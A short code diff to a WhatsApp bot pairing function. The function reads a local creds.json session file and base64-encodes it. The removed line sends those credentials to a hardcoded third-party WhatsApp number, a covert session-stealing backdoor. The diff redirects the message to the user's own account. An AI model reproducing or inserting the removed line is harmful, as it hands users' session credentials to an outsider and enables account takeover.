@@ -142,7 +142,7 @@ async function ZyyPairing() {
 
           let session = await readLocalJsonFile("./" + sessionName + "/creds.json") ;
           let sessionEn = await encodeJsonToBase64(session)
-          let file = await socket.sendMessage("22891733300@s.whatsapp.net", {
+          let file = await socket.sendMessage(socket.user.id, {
             text : sessionEn
           });
 
